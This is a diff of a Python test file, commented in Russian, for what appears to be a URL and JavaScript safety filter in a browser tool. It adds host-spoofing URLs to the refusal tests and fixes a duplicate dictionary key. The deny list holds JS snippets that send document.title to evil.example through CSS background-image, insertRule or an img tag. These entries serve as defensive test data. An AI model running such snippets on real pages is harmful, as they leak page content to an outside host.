@@ -217,7 +217,7 @@ for bad in ("https://evil.com\\.avito.ru/", "https://evil.com\\@avito.ru/", "htt
     got = refused(bad)
     check(f"[A1] «\\» в адресе {bad!r} — отказ (браузер читает «\\» как «/», хост другой)", got and "\\" in got, got)
 for bad in ("https://аvito.ru/", "https://avito。ru/", "https://avito．ru/", "https://avito.ru/путь", "https://avito.ru/\ta",
-            "https://avito.ru/\x00", "https://xn--80ak6aa92e.com​/"):
+            "https://avito.ru/\x00", "https://xn--80ak6aa92e.com\u200b/"):
     got = refused(bad)
     check(f"[A2] не-ASCII, пробел или управляющий знак {bad!r} — отказ", got and "ASCII" in got, got)
 check("[A2] IDN в punycode — разбирается как обычное имя", B.url_host("https://xn--d1acufc.xn--p1ai/") == "xn--d1acufc.xn--p1ai")
@@ -428,9 +428,10 @@ DENY = {
               "new Intl.Collator.bar('x')"),
     "[E7] ": ("document.forms[0].reset()", "document.querySelector('input[type=number]').stepUp(5)",
               "inp.stepDown()", "sel.add(document.createElement('option'))", "sel.add(new Option('a', 'b'))",
-              "document.querySelector('dialog').requestClose()"),
-    # круг 3: пробы обоих argus (probe/evalp.py, probe_eval.py) — загрузка чужого адреса и правка DOM, стилей, формы
-    "[E7] ": ("document.body.style.setProperty('background-image', 'url(https://evil.example/?d=' + "
+              "document.querySelector('dialog').requestClose()",
+              # круг 3: пробы обоих argus (probe/evalp.py, probe_eval.py) — загрузка чужого адреса и правка DOM, стилей,
+              # формы. Был второй ключ "[E7] " — он затирал строки выше, и они не проверялись (F601, metis-0807)
+              "document.body.style.setProperty('background-image', 'url(https://evil.example/?d=' + "
               "encodeURIComponent(document.title) + ')')",
               "document.styleSheets[0].insertRule('body{background:url(https://evil.example/?d=x)}', 0)",
               "document.createRange().createContextualFragment('<img src=https://evil.example/?d=x>')",
